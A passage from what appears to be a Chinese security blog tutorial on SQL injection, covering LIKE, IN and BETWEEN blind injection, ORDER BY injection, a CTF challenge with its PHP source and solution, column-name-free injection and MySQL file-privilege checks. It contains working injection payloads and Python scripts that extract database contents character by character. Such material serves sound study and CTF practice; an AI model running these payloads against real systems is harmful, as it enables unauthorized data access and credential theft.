class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27; <span class="hljs-keyword">or</span> database() like <span class="hljs-symbol">&#x27;s</span>%&#x27;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>strs = string.printable<br>url = <span class="hljs-string">&quot;.............id=&quot;</span><br><br>database1 = <span class="hljs-string">&quot;&#x27; or database() like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br>table1 = <span class="hljs-string">&quot;&#x27; or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br>cloumn1 = <span class="hljs-string">&quot;&#x27; or (select column_name from information_schema.columns where table_name=\&quot;users\&quot; and table_schema=database() limit 1,1) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br>data1 = <span class="hljs-string">&quot;&#x27; or (select username from users limit 0,1) like &#x27;&#123;&#125;%&#x27;--+&quot;</span><br><br>payload = database1<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>        char = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br>            payloads = payload.<span class="hljs-built_in">format</span>(name+j)<br>            urls = url+payloads<br>            r = requests.get(urls)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                name += j<br>                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                char = j<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> char ==<span class="hljs-string">&#x27;#&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h3><p>在过滤等号或者过滤like等的sql注入情况下IN很有用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id in (1,2);<br>+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>+----+----------+------------+<br>2 rows in set (0.00 sec)<br><br>mysql&gt; select substr(&#39;abc&#39;,1,1) in (&#39;z&#39;);<br>+----------------------------+<br>| substr(&#39;abc&#39;,1,1) in (&#39;z&#39;) |<br>+----------------------------+<br>|                          0 |<br>+----------------------------+<br>1 row in set (0.00 sec)<br><br>mysql&gt; select substr(&#39;abc&#39;,1,1) in (&#39;a&#39;);<br>+----------------------------+<br>| substr(&#39;abc&#39;,1,1) in (&#39;a&#39;) |<br>+----------------------------+<br>|                          1 |<br>+----------------------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="Between"><a href="#Between" class="headerlink" title="Between"></a>Between</h3><p>BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; select * from users where id between 1 and 3;<br>+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>|  3 | Dummy    | p@ssword   |<br>+----+----------+------------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; select * from users where username between &#39;sa&#39; and &#39;sz&#39;;<br>+----+----------+-----------+<br>| id | username | password  |<br>+----+----------+-----------+<br>|  4 | secure   | crappy    |<br>|  5 | stupid   | stupidity |<br>|  6 | superman | genious   |<br>+----+----------+-----------+<br>3 rows in set (0.00 sec)<br><br>还支持16进制<br>mysql&gt; select * from users where username between 0x7365 and 0x737a;<br>+----+----------+-----------+<br>| id | username | password  |<br>+----+----------+-----------+<br>|  4 | secure   | crappy    |<br>|  5 | stupid   | stupidity |<br>|  6 | superman | genious   |<br>+----+----------+-----------+<br>3 rows in set (0.00 sec)<br><br>可以结合字符串截取进行盲注<br>mysql&gt; select * from users where substr(username,1,1) between &#39;a&#39; and &#39;d&#39;;<br>+----+----------+------------+<br>| id | username | password   |<br>+----+----------+------------+<br>|  1 | Dumb     | Dumb       |<br>|  2 | Angelina | I-kill-you |<br>|  3 | Dummy    | p@ssword   |<br>|  7 | batman   | mob!le     |<br>|  8 | admin    | admin      |<br>+----+----------+------------+<br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h3><p>首先，order by作用：</p><p>就是对查询数据进行排列的方法，例如：</p><p><img src="https://s3.ax1x.com/2020/12/25/rfu8RP.png" alt="re"></p><p>可以发现，它是按照第一列id从小到大排列的</p><p><img src="https://s3.ax1x.com/2020/12/25/rfuDGq.png" alt="hr"></p><p>可以发现，它是按照第二列username从小到大排列的</p><p>以上就可以知道order by的用法了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 列名(或者数字) <span class="hljs-keyword">asc</span>；升序(默认升序)<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 列名(或者数字) <span class="hljs-keyword">desc</span>；降序<br></code></pre></td></tr></table></figure><p>order by 盲注后台sql查询语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql=&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $id<span class="hljs-string">&quot;;</span><br></code></pre></td></tr></table></figure><p>我们可以通过 asc 和 desc 来判断是否存在order by注入漏洞，因为 asc 和 desc 排列方式不同，如果我们输入这个改变了排列方式，那么说明我们写入的东西在order by 后面。</p><p><img src="https://s3.ax1x.com/2020/12/26/rf6gde.png" alt="ger"></p><p><img src="https://s3.ax1x.com/2020/12/26/rf6fJA.png" alt="gr"></p><ol><li><p>报错注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">直接在<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>后面加语句：<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> (<span class="hljs-keyword">SELECT</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>))) 进行报错注入<br></code></pre></td></tr></table></figure></li><li><p>rand()方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">rand()会返回一个<span class="hljs-number">0</span>和<span class="hljs-number">1</span>之间的随机数，如果参数被赋值，同一个参数会返回同一个数。<br>这里就可以用布尔盲注的方式来进行注入<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rand(mid(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">5</span>)<br>当然这里也可以用时间盲注的方式。<br></code></pre></td></tr></table></figure></li><li><p>时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">在<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>后面的不会根据计算的结果来排序，但是当我们的payload有延迟命令的时候，页面还是会延迟的。<br><br>使用<span class="hljs-keyword">and</span>连接时间延迟payload：<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (If(substr(version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-number">5</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>)))<br></code></pre></td></tr></table></figure></li><li><p>配合union select 进行注入</p><p>原理：我们目的是读取F1ag里面的那串16加密的字符</p><p><img src="https://s3.ax1x.com/2020/12/26/rfb8QU.png" alt="gre"></p><p>然后对第二列排列：</p><p><img src="https://s3.ax1x.com/2020/12/26/rfqtc8.png" alt="grs"></p><p>当我们在union select后面那里的2换为6会发生什么呢：</p><p><img src="https://s3.ax1x.com/2020/12/26/rfqI41.png" alt="fse"></p><p>发现没啥变化，还是开始查询那个在第一行，但是当我们把再换一个呢：</p><p><img src="https://s3.ax1x.com/2020/12/26/rfqODe.png" alt="gser"></p><p>可以发现想读取的东西就提到第一行了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p><p>分析上面，就是当我们在第二个位置的地方输入正确的字符时，输入的就会提到第一个，当错误的时候，想读取的东西就提到第一行了</p><p>适用场景：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">过滤了列名<br>过滤了括号<br>适用于已知该表的列名以及列名位置的注入<br></code></pre></td></tr></table></figure><p>下面是三之师傅出的一道order by 注入的ctf，和上面讲的方法一致：</p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dbhost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span><br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span><br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&#x27;root&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>);<br><span class="hljs-keyword">if</span>(! <span class="hljs-variable">$conn</span> )<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . mysqli_error());<br>&#125;<br>mysqli_select_db(<span class="hljs-variable">$conn</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$id</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please tell me the id , And you should think what is the sort way.&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-comment">//echo strtolower($id).&quot;&lt;br/&gt;&quot;;</span><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/(char|hex|conv|lower|lpad|into|password|md5|encode|decode|convert|cast)/i&#x27;</span>,strtolower(<span class="hljs-variable">$id</span>)) != <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//|\s</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoNoNo&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$id</span>, <span class="hljs-string">&quot;F1ag&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Close, but No!!! Thinking...&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;;&quot;</span>;<br><span class="hljs-variable">$retval</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$retval</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;???&#x27;</span>);<span class="hljs-comment">// . mysqli_error($conn)</span><br>&#125;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_array(<span class="hljs-variable">$retval</span>, MYSQLI_ASSOC))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt; id: <span class="hljs-subst">&#123;$row[&#x27;id&#x27;]&#125;</span> &lt;/td&gt; &quot;</span>.<br>         <span class="hljs-string">&quot;&lt;td&gt; name: <span class="hljs-subst">&#123;$row[&#x27;username&#x27;]&#125;</span> &lt;/td&gt; &lt;br/&gt;&quot;</span>.<br>         <span class="hljs-string">&quot;&lt;/tr&gt;&quot;</span>;<br>&#125;<br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>sql:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> NAMES utf8mb4;<br><span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Table structure for this_1s_th3_fiag_tab13</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `this_1s_th3_fiag_tab13`;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `this_1s_th3_fiag_tab13`  (<br>  `id` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `F1ag` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `password` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span><br>) ENGINE <span class="hljs-operator">=</span> MyISAM <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8_general_ci ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;<br><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of this_1s_th3_fiag_tab13</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `this_1s_th3_fiag_tab13` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;666C61677B643067335F74687265657A68317D&#x27;</span>, <span class="hljs-string">&#x27;threezh1&#x27;</span>, <span class="hljs-string">&#x27;You is pig&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `this_1s_th3_fiag_tab13` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;No the Flag&#x27;</span>, <span class="hljs-string">&#x27;oops,This is not the flag id&#x27;</span>, <span class="hljs-string">&#x27;You is pig&#x27;</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `this_1s_th3_fiag_tab13` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;No the Flag&#x27;</span>, <span class="hljs-string">&#x27;Not the flag also&#x27;</span>, <span class="hljs-string">&#x27;You is pig&#x27;</span>);<br><br><span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>已知：数据库名：users，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为2</p><p>因为我们想读取第二列里面得数据，所以就在第二列那里修改数据就好</p><p>所以构造payload：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">?id=<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;字符&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>返回：<br>id: <span class="hljs-number">1</span><span class="hljs-built_in"> name</span>: <span class="hljs-number">3</span><br>id: <span class="hljs-number">3</span><span class="hljs-built_in"> name</span>: threezh1<br><span class="hljs-built_in">?id</span>=<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>返回：<br>id: <span class="hljs-number">3</span><span class="hljs-built_in"> name</span>: threezh1<br>id: <span class="hljs-number">1</span><span class="hljs-built_in"> name</span>: <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>因为6是像读取的第一个字符，所以为6的时候，flag就在后面，但是超过6之后，flag就在前面了，所以就可以依次注入下去就知道了</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>key = <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;</span><br>words = <span class="hljs-string">&quot;&quot;</span><br>data = <span class="hljs-string">&quot;id=3 union select 3,&#x27;&#123;0&#125;&#x27;,3 order by 2&quot;</span><br>dic = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>        payload = data.<span class="hljs-built_in">format</span>(words + j)<br>        <span class="hljs-built_in">print</span>(payload)<br>        content = requests.get(<span class="hljs-string">&quot;http://127.0.0.1/index.php?&quot;</span> + payload)<br>        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> content.text:<br>            words = words + temp<br>            <span class="hljs-built_in">print</span>(words)<br>            <span class="hljs-keyword">break</span><br>        temp = j<br></code></pre></td></tr></table></figure></li></ol><p><img src="https://s3.ax1x.com/2020/12/26/rhQUHS.png" alt="grs"></p><p>这里有个问题就是，当select 1,2,3 中字段位的数据与数据库里的数据相等时，，匹配的时候如果是匹配的是7就是7不用再退一位。</p><p>最后跑出来是<code>666c61677b643067335f74687265657a68317c</code></p><p>那么真实的<code>flag</code>的<code>base16</code>编码为：<code>666c61677b643067335f74687265657a68317d</code></p><h3 id="无列名注入："><a href="#无列名注入：" class="headerlink" title="无列名注入："></a>无列名注入：</h3><h4 id="构造别名"><a href="#构造别名" class="headerlink" title="构造别名"></a>构造别名</h4><p>正常的查询如下：</p><p><img src="/wzimg/1.png" alt="z"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hahaha;<br></code></pre></td></tr></table></figure><p><img src="/wzimg/2.png" alt="x"></p><p>我们可以自己构造名字进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> b <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> hahaha)a;<br></code></pre></td></tr></table></figure><p><img src="/wzimg/3.png" alt="c"></p><h4 id="join-…-using-xx"><a href="#join-…-using-xx" class="headerlink" title="join … using(xx)"></a>join … using(xx)</h4><p>当知道表名为<code>users</code>时，使用如下语句得到列名<br>第一列：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">-1&#x27;</span> union all <span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b)c<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>第二列：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union all <span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id))c–+<br></code></pre></td></tr></table></figure><p>第三列：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; union all <span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id,username))c–+<br></code></pre></td></tr></table></figure><h3 id="文件读写："><a href="#文件读写：" class="headerlink" title="文件读写："></a>文件读写：</h3><h4 id="file-priv和secure-file-priv"><a href="#file-priv和secure-file-priv" class="headerlink" title="file_priv和secure-file-priv"></a>file_priv和secure-file-priv</h4><p><code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> file_priv <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span>$<span class="hljs-keyword">USER</span> host<span class="hljs-operator">=</span>$HOST;<br></code></pre></td></tr></table></figure><p><img src="/wzimg/4.png" alt="v"></p><p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><p>无内容，表示无限制。</p><p>为NULL，表示禁止文件读/写。</p><p>为目录名，表示仅允许对特定目录的文件进行读/写。</p><p>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。<br>三种方法查看当前<code>secure-file-priv</code>的值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@secure</span>_file_priv;<br><span class="hljs-keyword">select</span> 